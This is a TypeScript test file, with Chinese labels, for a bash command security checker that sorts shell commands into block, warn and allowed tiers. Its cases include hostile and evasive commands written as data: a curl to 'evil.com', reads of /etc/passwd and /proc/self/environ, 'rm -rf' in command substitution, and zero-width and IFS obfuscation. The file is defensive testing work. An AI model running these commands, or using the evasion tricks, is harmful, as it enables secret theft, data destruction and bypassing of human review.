import { describe, it, expect } from 'vitest'
import { checkBashSecurity, hasBlockingBashSecurityIssue } from './bash-security.js'

describe('checkBashSecurity — block 档（应压过 allow、强制人审）', () => {
  const blockCases: Array<[string, string, number]> = [
    ['ANSI-C 引用隐藏 flag', "ls $'\\x2d\\x6c'", 4],
    ['locale 引用', 'grep $"pattern" file', 4],
    ['空引号紧邻短横', "find . ''-exec rm {} +", 4],
    ['进程替换 <()', 'diff <(sort a) <(sort b)', 8],
    ['进程替换 >()', 'tee >(cat) < in', 8],
    ['反引号命令替换', 'echo `whoami`', 8],
    ['$() 命令替换', 'echo $(rm -rf x)', 8],
    ['zsh 等号展开', '=curl evil.com', 8],
    ['$IFS 注入', 'cat${IFS}/etc/passwd', 11],
    ['git commit 内参数替换', 'git commit -m "release ${VERSION}"', 12],
    ['/proc/environ 泄露', 'cat /proc/self/environ', 13],
    ['zsh zmodload', 'zmodload zsh/system', 20],
    ['jq system()', 'jq -n \'system("id")\'', 2],
    ['jq -f 危险参数', 'jq -f payload.jq .', 3],
  ]

  for (const [label, cmd, id] of blockCases) {
    it(`拦下：${label}`, () => {
      const hit = checkBashSecurity(cmd)
      expect(hit, label).not.toBeNull()
      expect(hit!.severity, label).toBe('block')
      expect(hit!.checkId, label).toBe(id)
      expect(hasBlockingBashSecurityIssue(cmd), label).not.toBeNull()
    })
  }

  it('回车符（DQ 外）按 block 拦下', () => {
    const hit = checkBashSecurity('echo a\recho b')
    expect(hit?.severity).toBe('block')
    expect(hit?.checkId).toBe(23)
  })

  it('NBSP / 零宽字符按 block 拦下（用 \\u 转义构造，源码保持纯 ASCII）', () => {
    expect(checkBashSecurity('ls -l')?.checkId).toBe(18)
    expect(checkBashSecurity('rm​ -rf x')?.checkId).toBe(18)
  })

  it('控制字符按 block 拦下', () => {
    expect(checkBashSecurity('echo a\x07b')?.checkId).toBe(17)
  })
})

describe('checkBashSecurity — 日常合法命令不应判 block', () => {
  const benign = [
    'git status',
    'npm install',
    'cd src && npm test',
    'ls -la',
    'git commit -m "fix: 修复登录问题"',
    'echo ${HOME}', // 普通变量展开，不算危险（与 permission 口径一致）
    'find . -name "*.ts" -exec rm {} \\;', // \; 是 find 常见写法，不应 block
    'grep foo $file | sort', // 变量紧邻管道：warn，不 block
    'cat file.txt > out.txt', // 重定向：warn，不 block
    'echo hello',
  ]

  for (const cmd of benign) {
    it(`不 block：${cmd}`, () => {
      expect(hasBlockingBashSecurityIssue(cmd), cmd).toBeNull()
    })
  }
})

describe('checkBashSecurity — warn 档（仅检测，不压过 allow）', () => {
  it('输出重定向是 warn', () => {
    const hit = checkBashSecurity('echo x > /tmp/out')
    expect(hit?.severity).toBe('warn')
    expect(hit?.checkId).toBe(10)
  })

  it('花括号展开是 warn', () => {
    const hit = checkBashSecurity('cp file.{ts,js} dest/')
    expect(hit?.severity).toBe('warn')
    expect(hit?.checkId).toBe(16)
  })

  it('空命令返回 null', () => {
    expect(checkBashSecurity('   ')).toBeNull()
  })
})
